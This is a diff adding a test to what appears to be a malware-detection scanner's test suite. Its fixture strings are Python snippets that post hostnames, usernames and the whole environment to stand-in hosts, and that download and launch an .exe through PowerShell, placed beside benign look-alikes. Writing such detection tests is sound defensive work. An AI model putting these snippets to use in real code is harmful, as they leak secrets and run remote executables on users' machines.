@@ -113,6 +113,26 @@ test("install scripts shaped like attacks: probes, hidden files, self-deletion, 
   assert.deepEqual(ok.findings.filter(f => /^install-|^dep-confusion/.test(f.rule) && f.severity !== "info").map(f => `${f.rule} ${f.file}`), []);
 });
 
+test("beacons inside functions, posted environments and .exe droppers", async () => {
+  const bad = project({
+    "probe/main.py": j("import socket, os, requests\ndef info():\n    return {'h': socket.gethost", "name(), 'u': os.getlogin()}\ndef send():\n    requests.post('http://203.0.113.9/c', json=info())\n"),
+    "leak/run.py": j("import os, requests\nenv_vars = dict(os.envi", "ron)\nrequests.post('https://x.example', json=env_vars)\n"),
+    "drop/__init__.py": j("import subprocess\ncmd = 'curl.exe -L https://x.example/a.exe -o \"a", ".exe\"'\nsubprocess.run(['powershell', '-Command', cmd])\nsubprocess.run(['powershell', '-Command', 'Start-Process a.exe'])\n"),
+  });
+  const r = await run(bad, { noIgnore: true });
+  const by = id => [...new Set(r.findings.filter(f => f.rule === id).map(f => f.file))].sort();
+  assert.deepEqual(by("mal-recon-send"), ["leak/run.py", "probe/main.py"]);
+  assert.deepEqual(by("mal-download-exe-run"), ["drop/__init__.py"]);
+
+  const good = project({
+    "srv/proc.py": "import os, subprocess\nenv = dict(os.environ)\nsubprocess.run(['node', 'server.js'], env=env)\n",
+    "telemetry.py": "import socket, requests\nHOST = socket.gethostname()\nrequests.get('https://api.example.com/health')\n",
+    "tests/beacon_test.py": "import socket, getpass, requests\nrequests.post('http://x', json=[socket.gethostname(), getpass.getuser()])\n",
+  });
+  const g = await run(good, { noIgnore: true });
+  assert.deepEqual(g.findings.filter(f => /^mal-(recon-send|download-exe-run)$/.test(f.rule)).map(f => f.file), []);
+});
+
 test("payloads decoded on one line and run on another; names glued from pieces", async () => {
   const bad = project({
     "tool.py": j("import base64\npayload = 'cHJpbnQoMSk='\ndecoded = base64.b64", "decode(payload).decode()\nex", "ec(decoded)\n"),
